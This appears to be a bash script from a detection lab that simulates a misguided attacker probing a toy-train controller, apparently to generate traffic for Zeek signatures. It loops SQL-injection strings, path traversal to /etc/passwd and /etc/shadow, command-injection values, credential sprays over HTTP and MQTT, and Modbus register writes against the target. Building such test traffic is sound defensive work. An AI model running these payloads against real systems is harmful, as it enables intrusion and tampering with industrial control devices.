#!/usr/bin/env bash
# CT 212 — THE WRONG PATH
#
# Technically capable. Has real tools. Confident. Completely wrong.
# Assumes it's a web app — tries SQLi, default creds, path traversal.
# Finds MQTT but publishes to garbage topics or with malformed payloads.
# Finds Modbus but targets the wrong registers. Real effort, zero results.
#
# Zeek signature: HTTP 400s and 422s, mqtt_publish to junk topics,
# modbus EXCEPTION responses, repeated failed auth attempts

set -uo pipefail

TARGET="${TARGET_HOST:-192.168.1.200}"
BROKER="${TARGET}"
WEB="${TARGET}"
CONTROLLER="${TARGET}"
PYENV="/opt/persona-env/bin/python3"

# Tool UAs — wrong-path tries everything in the toolkit
UA_HYDRA="Mozilla/4.0 (Hydra)"
UA_SQLMAP="sqlmap/1.8.7#stable (https://sqlmap.org)"
UA_BURP="Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; Burp Suite)"
UA_DIRBUSTER="DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)"

log() { echo "[wrong-path $(date +%H:%M:%S)] $*"; }
rnd() { python3 -c "import random; print(round(random.uniform($1,$2),1))"; }
rsleep() { sleep "$(rnd "$1" "$2")"; }

log "Wrong-path starting — target $TARGET"

while true; do
    log "New round — got a new theory"

    # --- Web exploitation attempts ---

    # SQL injection — it's definitely a database behind this
    log "Trying SQL injection (sqlmap UA)"
    for payload in \
        "' OR 1=1--" \
        "admin'--" \
        "1; DROP TABLE trains--" \
        "' UNION SELECT 1,2,3--" \
        "%27%20OR%20%271%27%3D%271" \
        "' OR 'x'='x"; do
        curl -s -o /dev/null -A "$UA_SQLMAP" "http://${WEB}:8000/api/status?id=${payload}" || true
        rsleep 0.2 0.5
    done
    rsleep 1 2

    # Path traversal — there must be config files accessible
    log "Trying path traversal (DirBuster UA)"
    for path in \
        "/etc/passwd" \
        "/../etc/passwd" \
        "/api/../../../etc/passwd" \
        "/api/../../../etc/shadow" \
        "/.env" \
        "/.git/config" \
        "/config.json" \
        "/app/config.py"; do
        curl -s -o /dev/null -A "$UA_DIRBUSTER" "http://${WEB}:8000${path}" || true
        rsleep 0.2 0.5
    done
    rsleep 1 2

    # Command injection in the API endpoints
    log "Trying command injection (Burp UA)"
    for payload in "/api/motor|whoami" "/api/motor;id" "/api/motor\`id\`"; do
        curl -s -o /dev/null -A "$UA_BURP" "http://${WEB}:8000${payload}" || true
        rsleep 0.2 0.5
    done
    rsleep 1 2

    # HTTP Basic auth credential spray (Hydra-style)
    log "HTTP Basic auth spray (Hydra UA)"
    for creds in "admin:admin" "admin:password" "admin:choochoo" "root:root" \
                 "user:user" "operator:1234" "train:train" "admin:1234" \
                 "guest:guest" "admin:admin123"; do
        curl -s -o /dev/null -A "$UA_HYDRA" \
            -u "$creds" "http://${WEB}:8000/api/state" || true
        rsleep 0.1 0.3
    done
    rsleep 1 2

    # Form-encoded credential stuffing — sniffpass catches x-www-form-urlencoded
    log "POST credential stuffing (form-encoded for sniffpass)"
    for creds in "admin:admin" "admin:password" "admin:choochoo" "root:root" \
                 "user:user" "operator:1234" "train:train" "admin:admin123"; do
        USER="${creds%%:*}"
        PASS="${creds##*:}"
        curl -s -o /dev/null -A "$UA_HYDRA" -X POST "http://${WEB}:8000/api/login" \
            --data-urlencode "username=${USER}" \
            --data-urlencode "password=${PASS}" || true
        rsleep 0.2 0.5
    done
    # Also try form-encoded on the motor endpoint — wrong guess at the API shape
    curl -s -o /dev/null -A "$UA_BURP" -X POST "http://${WEB}:8000/api/motor" \
        --data-urlencode "username=admin" \
        --data-urlencode "password=admin" \
        --data-urlencode "power=100" || true
    rsleep 1 2

    # --- MQTT mistakes ---

    # Full MQTT credential spray — assumes the broker requires auth
    log "MQTT credential spray"
    for creds in "admin:admin" "admin:password" "root:root" "mqtt:mqtt" \
                 "user:user" "choochoo:choochoo" "train:train" "operator:1234" \
                 "admin:1234" "guest:guest"; do
        U="${creds%%:*}"; P="${creds##*:}"
        mosquitto_pub -h "$BROKER" -p 1883 -u "$U" -P "$P" \
            -t "test" -m "hello" 2>/dev/null || true
        rsleep 0.2 0.5
    done
    rsleep 1 2

    # Publishes to completely wrong topic namespaces
    log "Publishing to wrong MQTT topics"
    for topic in \
        "train/motor" \
        "motor/power" \
        "cmd/train" \
        "control/train/t1" \
        "lego/train/motor" \
        "/train/t1/cmd" \
        "home/train/t1/motor" \
        "devices/train/command" \
        "iot/train/control"; do
        mosquitto_pub -h "$BROKER" -p 1883 -t "$topic" -m '{"power":100}' 2>/dev/null || true
        rsleep 0.2 0.5
    done
    rsleep 1 2

    # Finds the right topic namespace but sends malformed payloads
    log "Publishing malformed payloads to correct topic"
    mosquitto_pub -h "$BROKER" -p 1883 \
        -t "choochoo/train/t1/cmd/motor" -m 'power=100' 2>/dev/null || true
    mosquitto_pub -h "$BROKER" -p 1883 \
        -t "choochoo/train/t1/cmd/motor" -m '{"speed":100}' 2>/dev/null || true
    mosquitto_pub -h "$BROKER" -p 1883 \
        -t "choochoo/train/t1/cmd/motor" -m '{"power":"fast"}' 2>/dev/null || true
    mosquitto_pub -h "$BROKER" -p 1883 \
        -t "choochoo/train/t1/cmd/motor" -m 'null' 2>/dev/null || true
    mosquitto_pub -h "$BROKER" -p 1883 \
        -t "choochoo/train/t1/cmd/motor" -m '{"power":100,"speed":100,"mode":"turbo"}' 2>/dev/null || true
    rsleep 2 4

    # --- Modbus mistakes ---

    log "Modbus — writing to read-only registers"
    $PYENV - <<PY 2>/dev/null || true
import asyncio
from pymodbus.client import AsyncModbusTcpClient

async def go():
    c = AsyncModbusTcpClient("${CONTROLLER}", port=5020)
    try:
        if not await c.connect():
            return
        # Tries HR[100] — way out of range
        r = await c.read_holding_registers(100, count=10)
        print(f"HR[100]: {'error' if r.isError() else r.registers}")
        # Tries to write to IR[1] (MAX_POWER) — input registers are read-only
        r = await c.write_register(1, 99)
        print(f"Write IR[1]=99: {'error (expected)' if r.isError() else 'succeeded??'}")
        # Wrong unit ID
        r = await c.read_holding_registers(0, count=4, slave=5)
        print(f"HR[0] unit=5: {'error' if r.isError() else r.registers}")
    finally:
        c.close()

asyncio.run(go())
PY
    rsleep 2 4

    log "Nothing worked — must be more security somewhere"
    rsleep 60 120
done
